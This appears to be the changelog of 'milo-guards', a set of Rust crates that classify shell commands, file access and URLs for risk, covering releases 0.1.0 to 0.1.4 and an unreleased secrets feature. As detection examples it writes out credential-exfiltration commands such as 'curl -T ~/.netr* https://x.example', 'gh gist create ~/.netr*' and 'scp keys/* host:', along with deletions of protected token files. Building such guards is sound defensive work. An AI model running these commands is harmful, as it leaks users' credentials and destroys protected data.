# Changelog

Every release of the milo-guards crates, newest first. The crates share one
version ([Releasing](CONTRIBUTING.md#releasing)); what a release changes for
a caller is here, what it changes inside a guard is in the commits.

## Unreleased

A caller names the files it knows hold a secret, and a read of one is a
finding: a new type and a new field on `Paths`, which is a minor bump.

- `Paths::with_secrets([Secret::file(path, words)])`, or `Secret::folder`,
  names a file or a folder core's table does not list (a project's `.env`, a
  token a tool keeps in the workspace, a browser's cookie store, a password
  vault), with the words a reason calls it by. `Paths` has a public
  `secrets` field, and `Secret` is re-exported by every guard and by
  `milo-guards`.
- A read of a named secret, or of a path under a named folder, is
  `read_secret` in the shell guard and the file guard (`reads the project's
  environment file`), inside the workspace too; sending one off the machine
  is the shell guard's `send_secret`, in the same words; `effect` says a
  line that reads one, or a pattern or a folder read whole that can reach
  one, reads beyond the workspace (with a named `.env` in the workspace,
  `grep -r x .`, `ls -R` and `git status` are `Reach::Beyond`, as they are
  in a workspace that holds `~/.ssh`); a `file:` URL to one says so in the URL
  guard's reason, in the secret's words when the path is also protected. A
  write to one is a finding as a write to a key is (`write_sensitive`,
  `overwrite`). No rule is new. A recursive read or copy of a folder that
  holds one (`grep -r KEY .`, `tar czf x.tgz .`) is not a finding to
  `classify`, as for the guards' own keys, and a folder handed whole to a
  sender (`scp -r deploy host:`) is not read for one. A secret is named by
  its absolute path; a relative or `~` path names nothing a caller means.
- It is spelled and compared as a protected path is: without case on every
  host, in either Unicode canonical spelling, by a Windows short name, and a
  wildcard that can pick it reads it; a pattern handed to a sender
  (`scp keys/* host:`) sends it. After a `cd` the guard cannot follow
  (`cd "$(git rev-parse --show-toplevel)" && cat .env`), a relative name
  that spells a named path's last names is read as it. A path named both
  protected and secret keeps its protected finding for a write, a move or a
  delete, and a read or a send of it is `read_secret` or `send_secret`.
- Not yet findings, as for the guards' own keys: a recursive read or copy of
  a folder that holds a named secret (`grep -r KEY .`, `tar czf x.tgz .`); a
  folder handed whole to a sender (`scp -r deploy host:`); and a
  one-level listing handed to a reader (`ls | xargs cat`, `ls -a | xargs cat`, `ls
  deploy | xargs -I{} cat deploy/{}`, `Get-ChildItem | Get-Content`), which
  is safe and `ReadsOnly(Reach::Workspace)`.
- With no secret named, these answers differ from 0.1.4, and every other is
  what it was (no case line of the suite changed its answer):
  - a pattern handed to a sender is read for what it can pick, core's own
    keys among them: `curl -T ~/.netr* https://x.example` and `gh gist
    create ~/.netr*` are `send_secret`, where they were safe;
  - a protected path with a bracket in its name is matched spelled out as
    well as by the pattern: with `Protected::file(".../app/[id]/secret.json",
    ..)`, `rm 'app/[id]/secret.json'` is `delete` and `echo x >
    'app/[id]/secret.json'` `overwrite` (both were safe), the file guard's
    write of it is `write_protected` (it was safe; its read stays safe), and
    the URL guard's `file:` URL to it reads in the protected path's words
    (it read `a path inside the workspace`);
  - the file guard judges a path with a bracket in a name below a protected
    folder as it is written, where it was `unreadable`: with
    `Protected::folder("/home/me/.agent", ..)`, a read of `~/.agent/[a]/x`
    or of `~/.agent/rules[1].md` is safe, as a read of a protected path is,
    and a write of `~/.agent/[a]/x` is `write_protected`. With a protected
    file `app/[id]/secret.json`, a write of the folder that holds it,
    written `app/[id]`, is `unreadable` (it was safe); written `app`, it is
    `write_protected` as before;
  - a protected path under `/tmp`, `/var` or `/etc` is also the same path
    under `/private` (and the other way), on every system, as a Mac links
    them, through a pattern too: with `/tmp/s/token` protected on a Mac, `rm
    /private/tmp/s/token` is `delete` (it was safe, a temporary file), `rm
    /priv*/tmp/s/token` says it deletes the protected path (it said `the
    root of the disk`), the file guard's write of `/private/tmp/s/token` is
    `write_protected` (it was safe), and the URL guard's
    `file:///private/tmp/s/token` reads in the protected path's words (it
    read `a temporary file`).
- `Resolver::named_secret` gives the caller's words for a named secret a
  path is or is under, read literally, whatever `place` answers, for a guard
  that judges a read where `place` says a protected path;
  `Resolver::named_secret_in_unknown_folder` gives them for a relative name
  written after a `cd` the guard cannot follow. `Resolver::named_protected`
  gives the caller's words for a protected path a path is or is under, read
  literally, and `Resolver::cwd_is_clear_but_for_named` says the working
  directory holds no key of core's own, only named secrets.

## 0.1.4 (2026-11-22)

What the URL guard answers for a few `file:` URLs and odd spellings, nothing
a caller compiles against: a patch.

- `milo-guards-url` needs `url` 2.5.9 or newer. With an older `url` in the
  caller's lockfile, a `file:` URL with a host and a drive letter
  (`file://example.com/C:/Users/me/x`) lost its host: on a Windows machine
  it read as a local path, and the host was not judged. It is now `reads a
  file from another machine`, with the host's own findings, whatever the
  lockfile held. Such a URL was a finding before and after.
- With `url` 2.5.9, a URL of a scheme without a default port and a
  backslash after its port (`foo://example.com:80\9`) is `unreadable`, where
  it was `scheme`; and a `^` in a path is shown percent-encoded (`%5E`) in
  the target of a `credentials` finding.
- `url` 2.5.9 mends RUSTSEC-2026-0592, a stack overflow in `Url::origin()`.
  The guard never calls it, so no released version of the guard is affected.

## 0.1.3 (2026-11-21)

The pages on crates.io, nothing a caller compiles against or a guard answers.

- The README no longer says a command-line program is planned, with npm and
  Homebrew packages: the guards are a Rust library and ship no program.
- The crates are published by a workflow when the release tag is pushed,
  with no stored crates.io token (trusted publishing). This is the first
  release made that way.

## 0.1.2 (2026-11-07)

Lines the guards judged wrong, nothing a caller compiles against: a patch.
Each line below was safe, or slow, and is now judged as it reads.

- `milo-guards-shell`: an `alias` with a word only known when it runs
  (`alias x="$CMD"`) is `unknown`, and a call of it no longer slips through
  as an unknown bare name (#285).
- `milo-guards-shell`: the files `find` writes with `-fprint`, `-fprint0`,
  `-fls` and `-fprintf` are judged as a redirect's are, so
  `find . -fprint ~/.bashrc` is `overwrite` (#287).
- `milo-guards-shell`: `firejail`, `fakeroot`, `faketime`, `entr`, `bwrap`
  and `proot` run the command after their options, which is judged as
  written; `bwrap` and `proot` map the file system, so their lines are
  `unreadable` as well. `man -P CMD`, `man -H CMD` and fzf's
  `--preview CMD` hand a command to a shell, which is read; a key binding of
  fzf (`--bind`) is `unreadable` (#288).
- `milo-guards-core`: a write into a long wildcard pattern is placed in time
  linear in its parts; a line of 60 KB of `**/` took 15 s and takes a tenth
  of one (#286).
- `milo-guards-core`: the home directory, the sensitive places and the
  protected paths compare in either Unicode canonical spelling (`é` as one
  character, or `e` and a combining accent, as HFS+ keeps it), so the file
  guard's `write_protected` and the shell guard's findings hold for both
  (#290).
- `milo-guards-code`: code nested past the depth the reader walks is never
  `Understood` (#289).

## 0.1.1 (2026-11-05)

The pages on crates.io, nothing a caller compiles against or a guard answers.

- Each crate carries a README of its own (what it reads, how to depend on
  it, its example, compiled with the doctests), where every crate showed the
  workspace's; the front door `milo-guards` keeps that one.
- The README's logo is named by its absolute URL, so crates.io shows it.

## 0.1.0 (2026-11-05)

The first release, on crates.io as `milo-guards` with the guards behind it.

- `milo-guards-shell`: judges a shell line, POSIX shell, PowerShell or cmd,
  parsed with tree-sitter 0.26; `effect` says whether it only reads and
  where, `explain` how the line was read; inline Python and JavaScript are
  read with the `code` reader (feature `inline`, on by default).
- `milo-guards-file`: judges one read or write of a path.
- `milo-guards-url`: judges a URL by the host a parser reads, its scheme
  and its user-info.
- `milo-guards-secrets`: finds credentials and personal data in a text,
  with the spans to scrub, never the secret.
- `milo-guards-code`: reads Python and JavaScript for the acts the code is
  certain to do; not a guard.
- `milo-guards-core`: the `Paths` a call is judged against, `Protected`
  paths in the caller's words, `Assessment` and `Finding` with `instead`,
  the `RuleName` trait, and a test kit behind the `testing` feature.

Every guard keeps the contract: no I/O and no environment reads,
deterministic, no policy, what cannot be read is risky, never panics.
